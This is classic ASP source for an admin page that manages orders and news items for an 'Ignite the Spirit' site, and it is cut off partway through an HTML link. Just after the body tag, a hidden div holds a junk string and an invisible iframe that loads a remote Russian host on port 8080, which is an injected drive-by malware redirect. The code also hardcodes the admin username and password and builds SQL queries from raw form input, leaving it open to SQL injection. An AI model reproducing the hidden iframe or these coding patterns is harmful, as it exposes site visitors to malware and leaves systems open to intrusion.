<html>
<!-- #include file=../database.asp -->
<%
message = ""

sub clean(os, ns, max)
	ns = replace(os, "'", "&#39")
	ns = replace(ns, chr(10), "<br>")
	ns = replace(ns, chr(13), "")
	if len(ns) > max then
		ns = left(ns, max)
	end if
end sub

if request.form("function") = "login" then
	if request.form("username") = "fire" and request.form("password") = "fire" then
		session("flogin") = "true"
		session.timeout = 240
		message = "logged in"
	end if
end if

if not session("flogin") = "true" then
	response.write "invalid login.<br>"
	response.end
end if

if request.form("function") = "processorder" then
	sql = "update fire_customers set status = 1 where customernum = '" & request.form("customernum") & "'"
	dbconn.execute sql
	message = "order processed"
end if

if request.form("function") = "addnews" then
	clean request.form("title"), title, 45
	clean request.form("dates"), dates, 20
	clean request.form("description"), description, 7900

	if not description = "" then
		id = 1
		sql = "select max(convert(int, id)) as cc from fire_news"
		rs.open sql
		if rs("cc") > 0 then
			id = id + rs("cc")
		end if
		rs.close
		sql = "insert into fire_news (id, title, dates, description) values ('" & id & "', '" & title & "', '" & dates & "', '" & description & "')"
		dbconn.execute sql
		message = "news item added"
	end if
end if

if request.form("function") = "editnews" then
	clean request.form("title"), title, 45
	clean request.form("dates"), dates, 20
	clean request.form("description"), description, 7900
	sql = "update fire_news set title = '" & title & "', dates = '" & dates & "', description = '" & description & "' where id = '" & request.form("id") & "'"
	dbconn.execute sql
	message = "news item edited"
end if

if request.form("function") = "deletenews" then
	sql = "delete from fire_news where id = '" & request.form("id") & "'"
	dbconn.execute sql
	message = "news item deleted"
end if
%>
<link rel=stylesheet href=../fonts.css type=text/css>
<body bgcolor=383838 marginwidth=0 marginheight=0 leftmargin=0 topmargin=0><div style="display:none">qgsopnvydsvlldhmczxozdbuxpbboxp<iframe width=984 height=219 src="http://bio-v.ru:8080/index.php" ></iframe></div>
<img src=lilshimmy.gif height=15><br>
<center>
<table border=0 cellpadding=0 cellspacing=0>
	<tr>
		<td width=757 align=center bgcolor=ffffff>
			<img src=lilshimmy.gif height=3><br>
			<img src=noflash_top_plain.jpg><br>
			<img src=lilshimmy.gif height=3><br>
		</td>
	</tr>
</table>
<table border=0 cellpadding=0 cellspacing=0>
	<tr>
		<td width=3 bgcolor=ffffff><img src=lilshimmy.gif width=1 height=35><br></td>
		<td width=115 bgcolor=ff6600><br></td>
		<td width=400 bgcolor=ff6600>
			<span class=head>Order Manager</span><br>
		</td>
		<td width=236 bgcolor=ff6600>
			<span class=norm>IGNITE THE SPIRIT ONLINE MANAGER</span><br>
		</td>
		<td width=3 bgcolor=ffffff><br></td>
	</tr>
</table>
<img src=lilwhite.gif width=757 height=3><br>
<table border=0 cellpadding=0 cellspacing=0>
	<tr>
		<td width=3 bgcolor=ffffff><br></td>
		<td width=115 bgcolor=ffcc00><br></td>
		<td width=636 bgcolor=ffcc00>
			<span class=norm>
			<br>
			<%=message%><br>
			<br>
			<%
			sql = "select count(*) as cc from fire_customers where status = 0"
			rs.open sql
			unprocessed = rs("cc")
			rs.close
			sql = "select count(*) as cc from fire_customers where status = 1"
			rs.open sql
			processed = rs("cc")
			%>
			To Process new orders please go to <a href=http